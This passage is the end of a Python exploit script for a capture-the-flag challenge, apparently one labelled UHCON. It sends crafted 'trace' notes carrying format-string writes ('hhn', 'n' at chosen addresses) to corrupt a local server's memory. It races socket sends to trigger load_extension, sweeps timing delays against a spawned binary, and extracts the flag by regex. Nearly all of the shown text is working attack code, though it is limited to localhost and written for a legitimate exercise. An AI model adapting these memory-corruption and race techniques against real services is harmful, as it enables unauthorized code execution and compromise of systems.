        while time.perf_counter() < target:
            pass
        login_sock.sendall(login_wire)
    else:
        login_sock.sendall(login_wire)
        target = start - trigger_after_trace
        while time.perf_counter() < target:
            pass
        send_traces()
    login_data = recv_all(login_sock)
    trace_data = b"\n---NEXT-TRACE---\n".join(recv_all(sock) for sock in trace_socks)
    login_sock.close()
    for sock in trace_socks:
        sock.close()
    return login_data, trace_data


def exploit(
    host: str,
    port: int,
    *,
    prefix_len: int = 67,
    socket_fd: int = 6,
    race_delay: float | None = None,
) -> bytes:
    if host not in {"127.0.0.1", "localhost"}:
        raise ValueError("trace helper currently uses local HTTPConnection")
    session = login(port)
    notes = [
        write_note(0x32, 0x07, "hhn", prefix_len=prefix_len),
        # 0x092a20 -> b' *\\t\\0': the 600KB pre-write span is also the
        # mutex gate while pVfs is still intact.
        write_note(0x02, 0x092A20, "n", prefix_len=prefix_len, tail_width=500000),
        final_audit_note(prefix_len, socket_fd),
    ]
    # Only the flag-enabling write is safe before load_extension resolves the
    # entrypoint.  The remaining snapshots form gate -> db[2:6] -> db[0:2].
    for index, note in enumerate(notes[:1], 1):
        status, data = trace(port, session, note)
        print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
        if status != 202:
            raise RuntimeError((index, status, data))
        time.sleep(0.08)
    if race_delay is None:
        for index, note in enumerate(notes[1:], 2):
            status, data = trace(port, session, note)
            print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
            time.sleep(0.08)
        return trigger_load_extension(host, port)
    race_notes = notes[1:]
    login_data, trace_data = race_final_traces(host, port, session, race_notes, race_delay)
    print(f"trace_race_raw={trace_data!r}")
    return login_data + b"\n---TRACE-SOCKET---\n" + trace_data


def local_race_sweep(binary: str, delays_us: list[int], base_port: int = 18100) -> None:
    workdir = "/tmp/archive_flag_race"
    for index, delay_us in enumerate(delays_us):
        port = base_port + index
        process = subprocess.Popen(
            [binary, str(port)],
            cwd=workdir,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            deadline = time.monotonic() + 2
            while True:
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                        break
                except OSError:
                    if time.monotonic() >= deadline:
                        raise
            data = exploit(
                "127.0.0.1",
                port,
                race_delay=delay_us / 1_000_000,
            )
            match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", data)
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} flag={match.group(0) if match else None} data={data[:200]!r}")
            if match:
                return
        except Exception as error:
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} error={error!r}")
        finally:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    process.kill()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=18083)
    parser.add_argument("--probe", nargs=2, type=int, metavar=("START", "END"))
    parser.add_argument("--note")
    parser.add_argument("--final-note", action="store_true")
    parser.add_argument("--prefix-len", type=int, default=67)
    parser.add_argument("--socket-fd", type=int, default=6)
    parser.add_argument("--exploit", action="store_true")
    parser.add_argument("--race-delay-us", type=int)
    parser.add_argument("--race-sweep", nargs="+", type=int)
    parser.add_argument(
        "--binary",
        default=str(Path(__file__).resolve().parent / "package" / "deploy" / "prob"),
    )
    args = parser.parse_args()

    if args.race_sweep:
        local_race_sweep(args.binary, args.race_sweep, args.port)
        return
    if args.exploit:
        captured = exploit(
            "127.0.0.1",
            args.port,
            prefix_len=args.prefix_len,
            socket_fd=args.socket_fd,
            race_delay=(None if args.race_delay_us is None else args.race_delay_us / 1_000_000),
        )
        print(captured)
        match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", captured)
        if match:
            print(f"FLAG={match.group().decode(errors='replace')}")
        return

    session = login(args.port)
    if args.probe:
        note = positional_probe(*args.probe)
    elif args.final_note:
        note = final_audit_note(args.prefix_len, args.socket_fd)
    elif args.note is not None:
        note = args.note
    else:
        raise SystemExit("provide --probe START END or --note NOTE")
    if len(note) > 760:
        raise SystemExit(f"note too long: {len(note)}")
    print(f"session={session} note_len={len(note)}")
    print(trace(args.port, session, note))


if __name__ == "__main__":
    main()
```
